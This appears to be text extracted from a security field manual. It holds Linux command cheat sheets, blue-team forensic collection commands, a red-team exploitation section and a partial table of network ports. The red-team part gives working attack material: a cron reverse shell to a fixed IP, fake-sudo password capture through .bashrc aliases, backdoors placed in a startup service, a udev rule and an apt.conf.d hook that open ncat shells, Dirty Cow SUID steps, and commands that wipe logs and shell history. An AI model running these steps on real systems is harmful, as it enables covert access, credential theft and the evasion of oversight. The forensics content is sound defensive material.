get DNS information for domain 
dos2unix file.txt 
converts windows to unix format 
lsof -i tcp:80 
list all processes running on 
port 80 
ping host  
ping host  or IP and output 
results 
scp -r user@host:dir dir  
secure copy the directory dir 
from remote server to the 
directory dir on your machine 
scp file user@host:dir 
secure copy a file from your 
machine to the dir directory on a 
remote server 
scp user@host:file dir 
secure copy a file from remote 
server to the dir directory on 
your machine 
script -a file.txt 
record terminal to file 
ssh -p port user@host  
SSH connect to host on port as 
user 
ssh user@host  
SSH connect to host as user 
ssh-copy-id user@host 
add your key to host for user to 
enable a keyed or passwordless 
login 
wget  -O file.txt 
download a file 
whois domain.com 
get information for domain 
SEARCHING 
grep pattern files 
search for pattern in files 
grep -r pattern dir  
search recursively for pattern in 
dir 
grep -rn pattern dir  
search recursively for pattern in 
dir and show the line number 
found 
grep -r pattern dir --
include='*.ext 
search recursively for pattern in 
dir and only search in files 
with .ext extension 
command | grep pattern 
search for pattern in the output 
of command 
find file  
find all instances of file in 
real system 
locate file  
find all instances of file using 
indexed database built from the 
updatedb command. Much faster 
than find 
sed -i 's/day/night/g' file  
find all occurrences of day in a 
file and replace them with night 
- s means substitude and g means 
global - sed also supports 
regular expressions 
COMPRESSION 
123 
tar cf file.tar files  
create a tar named file.tar 
containing files 
tar xf file.tar  
extract the files from file.tar 
tar czf file.tar.gz files  
create a tar with Gzip 
compression 
tar xzf file.tar.gz  
extract a tar using Gzip 
gzip file  
compresses file and renames it to 
file.gz 
gzip -d file.gz 
decompresses file.gz back to file 
zip -r  \path\* 
Zip contents of directory 
SHORTCUTS 
ctrl+a  
move cursor to start of line 
ctrl+f  
move cursor to end of line 
alt+f  
move cursor forward 1 word 
alt+b  
move cursor backward 1 word 
REFERENCE: 
http://cheatsheetworld.com/programming/unix-linux-cheat-sheet/ 
L
L 
LINUX_Defend 
BLUE TEAM 
FORENSICS 
Linux 
Evidence Collection Order of Volatility (RFC3227) 
• 
Registers, cache 
• 
Routing table, arp cache, process table, kernel statistics, 
memory 
• 
Temporary file systems 
• 
Disk 
• 
Remote logging and monitoring data that is relevant to the 
system in question 
• 
Physical configuration, network topology 
• 
Archival media 
LINUX ARTIFACT COLLECTION 
System Information 
date 
uname –a 
hostname 
cat /proc/version 
lsmod 
service -status-all 
Disk/Partition Information 
124 
fdisk -l 
Open Files & Disk/Space Usage 
lsof -i 
du 
df 
Networking Configuration/Connections/Socket Stats 
ifconfig -a 
netstat -apetul 
netstat -plan 
netstat -plant 
ss -l 
ss -ta 
ss -tp 
User/Account Information 
whoami 
who 
last 
lastb 
cat /var/log/auth.log 
cat /etc/passwd 
cat /etc/shadow 
cat /etc/sudoers 
cat /etc/sudoers.d/* 
cut -d: -f1 /etc/passwd 
getent passwd | cut -d: -f1 
compgen -u 
xclip -o 
Processes/System Calls/Network Traffic 
ps -s 
ps -l 
ps -o 
ps -t 
ps -m 
ps -a 
ps -aef 
ps -auxwf 
top 
strace -f -e trace=network -s 10000 ; 
strace -f -e trace=network -s 10000 -p ; 
Environment/Startup/Tasks Information 
cat /etc/profile 
ls /etc/profile.d/ 
cat /etc/profile.d/* 
ls /etc/cron.* 
125 
ls /etc/cron.*/* 
cat /etc/cron.*/* 
cat /etc/crontab 
ls /etc/*.d 
cat /etc/*.d/* 
cat /etc/bash.bashrc 
cat ~/.bash_profile  
cat ~/.bashrc 
Kernel/Browser/PAM Plugins & Modules 
ls -la /lib/modules/*/kernel/* 
ls -la ~/.mozilla/plugins 
ls -la /usr/lib/mozilla/plugins 
ls -la /usr/lib64/mozilla/plugins 
ls -la ~/.config/google-chrome/Default/Extensions/ 
cat /etc/pam.d/sudo 
cat /etc/pam.conf 
ls /etc/pam.d/ 
Hidden Directories & Files 
find / -type d -name ".*" 
Immutable Files & Directories 
lsattr / -R 2> /dev/null | grep "\----i" 
SUID/SGID & Sticky Bit Special Permissions 
find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lg {} 
\; 
File & Directories with no user/group name 
find / \( -nouser -o -nogroup \) -exec ls -lg  {} \; 
File types in current directory 
file * -p 
Executables on file system 
find / -type f -exec file -p '{}' \; |  grep ELF 
Hidden Executables on file system 
find / -name ".*" -exec file -p '{}' \; | grep ELF 
Files modified within the past day 
find / -mtime -1 
Remotely Analyze Traffic Over SSH 
ssh root@ tcpdump -i any -U -s 0 -w - 'not port 22' 
126 
Persistence Areas of Interest 
/etc/rc.local 
/etc/initd 
/etc/rc*.d 
/etc/modules 
/etc/cron* 
/var/spool/cron/* 
Audit Logs 
ls -al /var/log/* 
ls -al /var/log/*tmp 
utmpdump /var/log/btmp 
utmpdump /var/run/utmp 
utmpdump /var/log/wtmp 
PROCESS FORENSICS 
Detailed Process Information 
ls -al /proc/[PID] 
NOTE: 
    cwd = Current Working Directory of Malware 
    exe = Binary location and whether it has been deleted 
Recover Deleted Binary Currently Running 
cp /proc/[PID]/exe /[destination]/[binaryname] 
Capture Binary Data for Review 
cp /proc/[PID]/ /[destination]/[PID]/ 
Binary Hash Information 
sha1sum /[destination]/[binaryname] 
md5sum /[destination]/[binaryname] 
Process Command Line Information 
cat /proc/[PID]/cmdline 
cat /proc/[PID]/comm 
NOTE: Significant differences in the above 2 outputs and the 
specified binary name under /proc/[PID]/exe can be indicative of 
malicious software attempting to remain undetected. 
Process Environment Variables  
NOTE: Includes user who ran binary 
strings /proc/[PID]/environ 
cat /proc/[PID]/environ 
Process File Descriptors/Maps  
127 
NOTE: Shows what the process is ‘accessing’ or using 
ls -al /proc/[PID]/fd 
cat /proc/[PID]/maps 
Process Stack/Status Information 
NOTE: May reveal useful elements 
cat /proc/[PID]/stack 
cat /proc/[PID]/status 
Show Deleted Binaries Currently Running 
ls -alr /proc/*/exe 2> /dev/null | grep deleted 
Process Working Directories  
NOTE: Including common targeted directories for malicious activity 
ls -alr /proc/*/cwd 
ls -alr /proc/*/cwd 2> /dev/null | grep tmp 
ls -alr /proc/*/cwd 2> /dev/null | grep dev 
ls -alr /proc/*/cwd 2> /dev/null | grep var 
ls -alr /proc/*/cwd 2> /dev/null | grep home 
MEMORY FORENSICS 
Dump Memory 
dd if=/dev/kmem of=/root/kmem 
dd if=/dev/mem of=/root/mem 
LiME 
https://github.com/504ensicsLabs/LiME/releases 
sudo insmod ./lime.ko "path=./Linmen.mem format=raw" 
Capture Disk Image 
fdisk -l 
dd if=/dev/sda1 of=/[outputlocation] 
REFERENCE: 
https://www.jaiminton.com/cheatsheet/DFIR/#linux-cheat-sheet 
https://blog.apnic.net/2019/10/14/how-to-basic-linux-malware-process-
forensics-for-incident-responders/ 
https://github.com/meirwah/awesome-incident-response#linux-evidence-
collection 
L
L 
LINUX_Exploit 
RED TEAM 
EXPLOITATION 
Linux 
128 
LINENUM 
Scripted local Linux enumeration and privilege escalation checks. 
NOTE: You must place this script on the target host. 
Summary of Categories Performed: 
Kernel and Distribution 
System Information 
User Information 
Privileged access 
Environmental 
Jobs/Tasks 
Services 
Version Information 
Default/Weak Credentials 
Useful File Searches 
Platform/software tests 
Full host enumeration with report output into tmp 
linenum.sh -s -r report.txt -e /tmp/ -t 
Direct execution one-liners 
bash  
REFERENCE: 
https://github.com/AlessandroZ/BeRoot/tree/master/Linux 
LINUX-SMART-ENUMERATION 
Linux enumeration tool for pentesting and CTFs with verbosity 
levels. 
NOTE: You must place this script on the target host. 
Summary of Categories Performed: 
User related tests. 
Sudo related tests. 
File system related tests. 
System related tests. 
Security measures related tests. 
Recurrent tasks (cron, timers) related tests. 
Network related tests. 
Services related tests. 
Processes related tests. 
Software related tests. 
Container (docker, lxc) related tests. 
Basic enumeration execution 
lse.sh 
Increase verbosity and enumeration information 
lse.sh -l1 
Dump everything that can be gathered from the host 
lse.sh -l2 
One-liner download & chmod 
wget "https://github.com/diego-treitos/linux-smart-
enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh 
130 
curl "https://github.com/diego-treitos/linux-smart-
enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh 
Direct execution one-liner 
bash  
  gcc -o mempodipper exploit.c 
  ./mempodipper 
CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux 
Kernel  
$TMPDIR2/croissant.c 
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null 
rm $TMPDIR2/croissant.c 
chown root:root $TMPDIR2/croissant 
chmod 4777 $TMPDIR2/croissant 
Crontab - Reverse shell 
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e 
/bin/bash")|crontab 2> /dev/null 
Backdoor Target User .bashrc 
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-
timesyncd.service-IgCBE0" 
cat  /tmp/$TMPNAME2 
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -
f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for 
\$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de 
passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" 
| /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && 
/usr/bin/sudo -S ' 
EOF 
if [ -f ~/.bashrc ]; then 
    cat /tmp/$TMPNAME2 >> ~/.bashrc 
fi 
if [ -f ~/.zshrc ]; then 
    cat /tmp/$TMPNAME2 >> ~/.zshrc 
fi 
rm /tmp/$TMPNAME2 
#OR add the following line inside Target user .bashrc file: 
$ chmod u+x ~/.hidden/fakesudo 
$ echo "alias sudo=~/.hidden/fakesudo" >> ~./bashrc 
#then create the fakesudo script. 
read -sp "[sudo] password for $USER: " sudopass 
echo "" 
sleep 2 
echo "Sorry, try again." 
echo $sudopass >> /tmp/pass.txt 
/usr/bin/sudo $@ 
Backdoor Startup Service 
132 
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 
2>/dev/null" 
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart 
Backdoor Target User Startup File 
First write a file in ~/.config/autostart/NAME_OF_FILE.desktop 
#vi file ~/.config/autostart/*.desktop and add the below: 
[Desktop Entry] 
Type=Application 
Name=Welcome 
Exec=/var/lib/gnome-welcome-tour 
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-
docs/seen-getting-started-guide 
OnlyShowIn=GNOME; 
X-GNOME-Autostart-enabled=false 
Backdoor Driver 
echo 
"ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RU
N+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-
drivers.rules > /dev/null 
Backdoor APT.CONF.D 
Create file in apt.conf.d directory:  
APT::Update::Pre-Invoke {"CMD"};  
When Target runs "apt-get update" your CMD will be executed. 
#Example Ncat CMD 
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 
2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor 
Linux Privilege Escalation MindMap 
133 
COVER TRACKS 
Reset logfile to 0 without having to restart syslogd etc: 
cat /dev/null > /var/log/auth.log 
Clear terminal history 
cat /dev/null > ~/.bash_history 
history -c 
export HISTFILESIZE=0 
export HISTSIZE=0 
unset HISTFILE 
REFERENCE: 
https://gtfobins.github.io/ 
https://twitter.com/mlgualtieri/status/1075788298285694981 
https://www.exploit-db.com/ 
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
%20and%20Resources/Linux%20-%20Privilege%20Escalation.md 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
%20and%20Resources/Linux%20-%20Persistence.md 
https://guif.re/linuxeop 
L
L 
LINUX_Hardening 
BLUE TEAM 
CONFIGURATION 
Linux 
LINUX HARDENING GUIDE 
https://github.com/ernw/hardening/blob/master/operating_system/linu
x/ERNW_Hardening_Linux.md 
134 
L
L 
LINUX_Ports 
ALL 
INFORMATIONAL 
Linux 
PORT 
APP_PROTOCOL 
SYSTEM SERVICE 
1 
TCP tcpmux 
TCP port service multiplexer 
5 
TCP rje 
Remote Job Entry 
7 
TCP echo 
Echo service 
9 
TCP discard 
Null service for connection 
testing 
11 
TCP systat 
System Status service for 
listing connected ports 
13 
TCP daytime 
Sends date and time to 
requesting host 
15 
tcp netstat 
Network Status (netstat) 
17 
TCP qotd 
Sends quote of the day to 
connected host 
18 
TCP msp 
Message Send Protocol 
19 
TCP chargen 
Character Generation 
service; sends endless 
stream of characters 
20 
TCP ftp-data 
FTP data port 
21 
TCP ftp 
File Transfer Protocol (FTP) 
port; sometimes used by File 
Service Protocol (FSP) 
22 
TCP ssh 
Secure Shell (SSH) service 
23 
TCP telnet 
The Telnet service 
25 
TCP smtp 
Simple Mail Transfer 
Protocol (SMTP) 
37 
TCP time 
Time Protocol 
39 
TCP rlp 
Resource Location Protocol 
42 
TCP nameserver 
Internet Name Service 
43 
TCP nicname 
WHOIS directory service 
49 
TCP tacacs 
Terminal Access Controller 
Access Control System for 
TCP/IP based authentication 
and access 
50 
TCP re-mail-ck 
Remote Mail Checking 
Protocol 
53 
TCP domain 
domain name services (such 
as BIND) 
63 
TCP whois++ 
WHOIS++, extended WHOIS 
services 
67 
TCP bootps 
Bootstrap Protocol (BOOTP) 
services;Dynamic Host 
135 
Configuration Protocol 
(DHCP) services 
68 
TCP bootpc 
Bootstrap (BOOTP) client; 
Dynamic Host Control 
Protocol (DHCP) clients 
69 
TCP tftp 
Trivial File Transfer 
Protocol (TFTP) 
70 
TCP gopher 
Gopher Internet document 
search and retrieval 
71 
TCP netrjs-1 
Remote Job Service 
72 
TCP netrjs-2 